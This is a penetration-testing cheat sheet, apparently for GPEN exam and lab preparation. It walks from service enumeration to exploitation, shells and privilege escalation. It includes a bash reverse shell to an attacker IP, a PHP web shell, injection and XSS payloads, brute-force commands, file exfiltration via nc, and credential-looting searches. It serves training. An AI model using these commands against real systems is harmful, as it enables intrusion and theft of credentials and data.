# Pentest Methodology

## How to Use This Pack

This is a fast lookup field manual for penetration testing practices. It is written to be searchable and command-focused.

Use it in this order during a target assessment:

1. Recon and service identification
2. Service-specific enumeration
3. Exploitation options
4. Shell stabilization
5. Privilege escalation
6. Looting and reporting notes

Suggested companion index columns:

* Keyword
* Tool
* Command
* When to Use
* Notes
* File/Section

---

# 1. Core Workflow

## 1.1 Standard Attack Loop

```bash
nmap -sC -sV -oN scan.txt <target>
```

Then ask:

* What ports are open?
* Which services and versions are exposed?
* Is there anonymous or default access?
* Is there a web app?
* Is there file sharing?
* Is there remote login?
* Is there a known exploit path?
* If foothold obtained, how do I escalate?

## 1.2 Quick Service Decision Tree

* 21 FTP: anonymous login, writable directories, file disclosure
* 22 SSH: valid creds, keys, old versions, port forwarding after foothold
* 23 Telnet: default creds, banner disclosure
* 25 SMTP: user enumeration, VRFY/EXPN, open relay checks
* 53 DNS: zone transfer, host enumeration
* 80/443 HTTP(S): directories, login pages, file upload, CMS fingerprinting
* 110/143 POP3/IMAP: valid creds, mail disclosure
* 111 RPCbind/NFS: shares, mountable exports
* 135/139/445 SMB/RPC: null sessions, shares, users, policies
* 161 SNMP: public/private strings, process/routes/users info
* 3306 MySQL: weak creds, local file read depending on config
* 3389 RDP: valid creds, NLA, screenshots after auth
* 5432 PostgreSQL: default creds, command execution via functions in some cases
* 5900 VNC: weak/no auth
* 6379 Redis: unauth access, file write abuse in bad configs
* 8009 AJP: Ghostcat-style checks when relevant
* 8080/8443 alternate web/admin panels

## 1.3 Useful Nmap Patterns

### Safe default

```bash
nmap -sC -sV -oN scan.txt <target>
```

### Full TCP scan

```bash
nmap -p- --min-rate 1000 -T4 -oN allports.txt <target>
```

### Follow-up targeted version scan

```bash
nmap -sC -sV -p <ports> -oN targeted.txt <target>
```

### UDP top ports

```bash
nmap -sU --top-ports 50 -oN udp.txt <target>
```

### Vulnerability scripts

```bash
nmap --script vuln -oN vuln.txt <target>
```

### SMB scripts

```bash
nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery <target>
```

### HTTP scripts

```bash
nmap -p80,443 --script http-enum,http-title,http-robots.txt <target>
```

---

# 2. Enumeration Toolkit

## 2.1 Banner and Basic Connectivity

```bash
nc -nv <target> <port>
curl -I http://<target>
wget http://<target>
whatweb http://<target>
```

## 2.2 Searchsploit Workflow

```bash
searchsploit <service/version>
searchsploit -m <EDB-ID>
```

Use it after version identification. Confirm exact version match before attempting exploit.

## 2.3 Credential Reuse Mindset

If you find a username or password anywhere, try it against:

* SSH
* SMB
* FTP
* Web login portals
* Database services
* WinRM / RDP if Windows

Document tested combinations to avoid repetition.

---

# 3. FTP

## 3.1 Enumeration

```bash
ftp <target>
# username: anonymous
# password: anonymous

nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst <target>
```

Check:

* Anonymous login
* Writable directories
* Downloadable config files
* Web root write if FTP backs a web server

## 3.2 Useful Actions

```bash
ls
pwd
binary
get <file>
put <file>
```

## 3.3 Abuse Ideas

* Upload web shell to web-accessible folder
* Download backups, credentials, SSH keys, configs
* Check for `.txt`, `.bak`, `.conf`, `.zip`, `.tar.gz`

---

# 4. SSH

## 4.1 Enumeration

```bash
nmap -p22 -sV <target>
ssh -V
```

## 4.2 Authentication Attempts

### Password auth

```bash
ssh <user>@<target>
```

### Private key auth

```bash
chmod 600 id_rsa
ssh -i id_rsa -o IdentitiesOnly=yes <user>@<target>
```

### Verbose troubleshooting

```bash
ssh -i id_rsa -o IdentitiesOnly=yes -vvv <user>@<target>
```

## 4.3 Brute Force

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<target>
```

## 4.4 Post-Login Quick Checks

```bash
id
hostname
uname -a
sudo -l
pwd
ls -la
ip a
ss -lntp
```

## 4.5 Port Forwarding

### Local forward

```bash
ssh -L 8080:127.0.0.1:80 <user>@<target>
```

### Remote forward

```bash
ssh -R 4444:127.0.0.1:4444 <user>@<target>
```

### Dynamic SOCKS proxy

```bash
ssh -D 9050 <user>@<target>
```

---

# 5. SMB / NetBIOS / RPC

## 5.1 Fast Enumeration

```bash
smbclient -L //<target>/ -N
smbclient //<target>/<share> -N
enum4linux -a <target>
enum4linux-ng -A <target>
```

## 5.2 Nmap SMB Scripts

```bash
nmap -p139,445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode <target>
```

## 5.3 Common Checks

* Null session
* Guest access
* Readable shares
* Writable shares
* Sensitive files: passwords, scripts, backups, Office docs, SSH keys

## 5.4 smbclient Usage

```bash
smbclient //<target>/<share> -U <user>
ls
cd <dir>
get <file>
put <file>
recurse ON
prompt OFF
mget *
```

## 5.5 Common Abuse Paths

* Retrieve config files with plaintext credentials
* Retrieve scripts with hardcoded creds
* Upload files to shared startup/script locations
* Crack recovered password hashes or reuse plaintext creds

## 5.6 Impacket Useful Commands

```bash
lookupsid.py <domain>/<user>:<pass>@<target>
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc_ip> -no-pass
smbclient.py <domain>/<user>:<pass>@<target>
psexec.py <domain>/<user>:<pass>@<target>
wmiexec.py <domain>/<user>:<pass>@<target>
```

---

# 6. HTTP / HTTPS Web Enumeration

## 6.1 Fingerprinting

```bash
whatweb http://<target>
curl -I http://<target>
wappalyzer
nikto -h http://<target>
```

## 6.2 Directory and File Discovery

### Gobuster

```bash
gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak
```

### Feroxbuster

```bash
feroxbuster -u http://<target>/ -x php,txt,html,bak -w /usr/share/wordlists/dirb/common.txt
```

Check for:

* `/admin`
* `/backup`
* `/uploads`
* `/robots.txt`
* `/login`
* `/register`
* `/test`
* `/phpinfo.php`
* old backup files: `.bak`, `.old`, `.swp`, `.zip`

## 6.3 Common Web Attack Surface

* Login forms
* Search boxes
* Comment fields
* File uploads
* Password reset workflows
* Cookies / JWTs
* Hidden parameters
* API endpoints

## 6.4 Quick Manual Inspection

Look for:

* HTML comments
* JavaScript files
* hidden form fields
* predictable IDs
* debug messages
* stack traces
* framework fingerprints

## 6.5 Vhost Discovery

```bash
ffuf -u http://<target>/ -H "Host: FUZZ.<domain>" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <size>
```

---

# 7. Web Attacks

## 7.1 SQL Injection Basics

### Common test payloads

```text
'
"
' OR 1=1-- -
' OR '1'='1'-- -
admin'-- -
```

### sqlmap basic

```bash
sqlmap -u "http://<target>/item.php?id=1" --batch
sqlmap -u "http://<target>/search.php?q=test" --forms --batch
sqlmap -r request.txt --batch
```

### Dumping

```bash
sqlmap -u "http://<target>/item.php?id=1" --dbs --batch
sqlmap -u "http://<target>/item.php?id=1" -D <db> --tables --batch
sqlmap -u "http://<target>/item.php?id=1" -D <db> -T <table> --dump --batch
```

Signs:

* SQL errors
* input changes query behavior
* boolean-based differences
* time delays

## 7.2 File Upload Abuse

### Checklist

* Allowed extensions?
* MIME type enforced?
* Content checked?
* Uploaded file path predictable?
* Executable by server?

### Web shell examples

```php
<?php system($_GET['cmd']); ?>
```

Try:

* `.php`
* `.phtml`
* `.php5`
* double extensions: `shell.php.jpg`

## 7.3 Local / Remote File Inclusion

### LFI tests

```text
?page=../../../../etc/passwd
?page=..%2f..%2f..%2f..%2fetc%2fpasswd
```

### Useful targets

* `/etc/passwd`
* web server configs
* app configs with creds
* log files for log poisoning
* PHP session files

## 7.4 Command Injection

### Tests

```text
;id
&& id
| id
`id`
$(id)
```

## 7.5 Authentication Weaknesses

* Default creds: admin/admin, admin/password
* Username enumeration
* Password reset logic flaws
* IDOR in profile editing
* Session fixation or predictable tokens

## 7.6 XSS Basics

### Test payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

For GPEN-style prep, focus more on recognizing XSS than building advanced payload chains.

---

# 8. SNMP

## 8.1 Enumeration

```bash
snmpwalk -v2c -c public <target>
snmpwalk -v1 -c public <target>
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <target>
```

Look for:

* usernames
* running processes
* installed software
* routing tables
* hostnames
* contact/location info

Common strings:

* public
* private

---

# 9. SMTP

## 9.1 Enumeration

```bash
nc -nv <target> 25
```

Try commands:

```text
VRFY root
VRFY admin
EXPN root
HELP
```

Nmap:

```bash
nmap -p25 --script smtp-commands,smtp-enum-users <target>
```

Use discovered usernames against SSH, SMB, web logins.

---

# 10. DNS

## 10.1 Enumeration

```bash
nslookup
host <domain> <dns_server>
dig axfr <domain> @<dns_server>
dig any <domain> @<dns_server>
```

### Zone transfer

```bash
dig axfr example.com @<target>
```

### Reverse lookup

```bash
dig -x <ip> @<dns_server>
```

---

# 11. NFS

## 11.1 Enumeration

```bash
showmount -e <target>
mount -t nfs <target>:/<share> /mnt/nfs
```

Check:

* readable exports
* writable exports
* exported home directories
* SSH key or script placement

---

# 12. Databases

## 12.1 MySQL

```bash
mysql -h <target> -u root -p
nmap -p3306 --script mysql-info,mysql-empty-password,mysql-users <target>
```

## 12.2 PostgreSQL

```bash
psql -h <target> -U postgres
```

## 12.3 MSSQL

```bash
sqsh -S <target> -U sa -P <password>
```

Look for:

* default creds
* weak creds
* ability to read files or execute commands depending on config

---

# 13. Password Attacks

## 13.1 Hydra

### SSH

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<target>
```

### FTP

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<target>
```

### HTTP POST forms

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

## 13.2 John the Ripper

### Basic

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

### Unshadow

```bash
unshadow passwd shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### ZIP / RAR / SSH key conversion

```bash
zip2john file.zip > hash.txt
rar2john file.rar > hash.txt
ssh2john.py id_rsa > id_rsa.hash
```

If a tool says the key has no password, there is nothing to crack.

## 13.3 Hash Identification

```bash
hashid <hash>
hash-identifier
```

---

# 14. Metasploit Essentials

## 14.1 Startup

```bash
msfconsole
search <service>
use <module>
show options
set RHOSTS <target>
set RPORT <port>
set LHOST <your_ip>
run
```

## 14.2 Sessions

```bash
sessions
sessions -i <id>
background
```

## 14.3 Meterpreter Basics

```bash
sysinfo
getuid
shell
pwd
ls
upload
download
```

## 14.4 Useful Post Modules

```bash
search local_exploit_suggester
use post/multi/recon/local_exploit_suggester
```

## 14.5 Common Advice

* Verify the target version first
* Read module description
* Check payload compatibility
* If exploit fails, try manual path too

---

# 15. Shells and Stabilization

## 15.1 Netcat Listener

```bash
nc -lvnp 4444
```

## 15.2 Bash Reverse Shell

```bash
bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'
```

## 15.3 Python PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```bash
export TERM=xterm
stty raw -echo; fg
reset
stty rows 40 columns 120
```

## 15.4 PHP Reverse Shell

Use a known PHP reverse shell and update IP/port before upload.

---

# 16. Linux Privilege Escalation

## 16.1 Initial Enumeration

```bash
id
whoami
hostname
uname -a
cat /etc/issue
sudo -l
env
pwd
ls -la ~
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null | head
getcap -r / 2>/dev/null
ss -lntp
ps aux
ip a
ip route
mount
cat /etc/crontab
ls -la /etc/cron*
```

## 16.2 LinPEAS

```bash
wget http://<your_ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Use automated tools, but validate findings manually.

## 16.3 Common Linux PrivEsc Paths

### sudo rights

```bash
sudo -l
```

Check GTFOBins for allowed binaries.

### SUID binaries

```bash
find / -perm -4000 2>/dev/null
```

### Capabilities

```bash
getcap -r / 2>/dev/null
```

### Cron jobs

Look for writable scripts or PATH abuse.

### Writable service files / scripts

Check custom scripts executed by root.

### PATH hijacking

If a privileged script calls commands without full path, place malicious binary earlier in PATH.

### NFS no_root_squash

Can allow SUID placement from mounted export.

### Kernel exploit

Only after exhausting easier options and validating version. Higher risk and often unnecessary in GPEN-style settings.

## 16.4 Useful Manual Checks

```bash
cat /etc/passwd
cat /etc/shadow
ls -la /home
history
find / -name "*.bak" -o -name "*.conf" -o -name "*.sql" 2>/dev/null
```

## 16.5 GTFOBins Reminder

Common binaries to remember:

* vim
* less
* awk
* find
* tar
* zip
* perl
* python
* cp
* bash

---

# 17. Windows Privilege Escalation

## 17.1 Initial Enumeration

```cmd
whoami
whoami /priv
whoami /groups
hostname
systeminfo
ipconfig /all
net users
net localgroup administrators
net user <username>
```

## 17.2 Services

Check for:

* weak service permissions
* unquoted service paths
* writable binaries

Commands:

```cmd
sc query
sc qc <service>
wmic service get name,displayname,pathname,startmode
```

## 17.3 Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
```

## 17.4 AlwaysInstallElevated

Registry checks:

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

If enabled in both, MSI abuse may be possible.

## 17.5 Stored Credentials

```cmd
cmdkey /list
```

## 17.6 WinPEAS

Run automated enumeration and confirm manually.

## 17.7 Common Windows Abuse Themes

* weak service perms
* unquoted service path
* SeImpersonatePrivilege with potato-style exploits when applicable
* plaintext creds in configs
* saved credentials
* writable startup folders or scripts

---

# 18. File Transfers

## 18.1 From Attacker to Linux Target

```bash
python3 -m http.server 8000
wget http://<your_ip>:8000/file
curl -O http://<your_ip>:8000/file
```

## 18.2 From Linux Target to Attacker

```bash
nc -lvnp 4444 > file
nc <your_ip> 4444 < file
```

## 18.3 Windows Transfers

```powershell
powershell -c "Invoke-WebRequest http://<your_ip>/file -OutFile file"
certutil -urlcache -f http://<your_ip>/file file
```

---

# 19. Pivoting and Tunneling Basics

## 19.1 SSH Dynamic Proxy

```bash
ssh -D 9050 <user>@<target>
```

Pair with proxychains.

## 19.2 Chisel Basics

### Server

```bash
chisel server --reverse -p 8000
```

### Client

```bash
chisel client <your_ip>:8000 R:socks
```

---

# 20. Loot Checklist After Foothold

Check these locations:

* home directories
* SSH keys
* shell history
* config files
* backups
* `.env`
* web app configs
* database creds
* browser stored creds if accessible
* scheduled task scripts

Useful commands:

```bash
find / -name id_rsa 2>/dev/null
find / -name "*.conf" 2>/dev/null
find / -name ".env" 2>/dev/null
find / -name "*.sql" 2>/dev/null
find / -name "*backup*" 2>/dev/null
```

---

# 21. Reporting Notes Template

For each finding, record:

* Host/IP
* Port/service
* Enumeration evidence
* Vulnerability or weakness
* Exploit path
* Credentials found/used
* Privilege level obtained
* Proof of access
* Risk summary
* Remediation note

Keep screenshots or terminal logs where possible.

---

# 22. Fast Command Reference

## 22.1 Nmap

```bash
nmap -sC -sV -oN scan.txt <target>
nmap -p- --min-rate 1000 -T4 <target>
```

## 22.2 Web

```bash
gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt
nikto -h http://<target>
whatweb http://<target>
```

## 22.3 SMB

```bash
smbclient -L //<target>/ -N
enum4linux -a <target>
```

## 22.4 SNMP

```bash
snmpwalk -v2c -c public <target>
```

## 22.5 FTP

```bash
ftp <target>
```

## 22.6 Passwords

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<target>
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## 22.7 Linux PrivEsc

```bash
sudo -l
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
```

## 22.8 Windows PrivEsc

```cmd
whoami /priv
systeminfo
wmic service get name,displayname,pathname,startmode
schtasks /query /fo LIST /v
```

---

# 23. Exam-Time Heuristics

## 23.1 When Stuck

* Re-check full port scan
* Re-check UDP if needed
* Reuse found creds everywhere
* Enumerate more before exploiting blindly
* Look for low-hanging fruit before complex paths

## 23.2 Prioritization

1. Anonymous/default access
2. Credential reuse
3. Public exploit with exact version match
4. Writable shares/uploads
5. Local privilege escalation from foothold

## 23.3 Common Mistakes

* Skipping full port scan
* Missing alternate web port
* Not trying found creds on SSH/SMB/web
* Ignoring file backups
* Spending too long on one exploit path
* Forgetting simple privilege escalation checks

---

# 24. Personal Notes Sections

Use these blank sections to customize with your own lab findings.

## 24.1 Services I Often Forget

*
*
*

## 24.2 Commands I Want Memorized

*
*
*

## 24.3 Credential Patterns I Keep Seeing

*
*
*

## 24.4 My Linux PrivEsc Checklist

* sudo -l
* SUID
* capabilities
* cron
* writable scripts
* credentials in configs
* kernel only last

## 24.5 My Windows PrivEsc Checklist

* whoami /priv
* services
* scheduled tasks
* saved creds
* AlwaysInstallElevated
* config files

---

# 25. Building an Index from This Pack

Suggested rows to add into your spreadsheet immediately:

* nmap basic
* full port scan
* smb enum
* ftp anonymous
* gobuster
* nikto
* sqlmap
* hydra ssh
* john basic
* metasploit search
* meterpreter basics
* shell stabilization
* sudo rights
* suid
* cron
* capabilities
* windows services
* scheduled tasks
* snmpwalk
* dns axfr
* nfs mount

---

# 26. Final Reminder

A strong GPEN-style workflow is not about deep theory during the exam. It is about quickly mapping:

* service -> enumeration
* finding -> exploit
* foothold -> escalation

Keep this pack searchable, concise, and updated with your own practice notes after each room or lab.
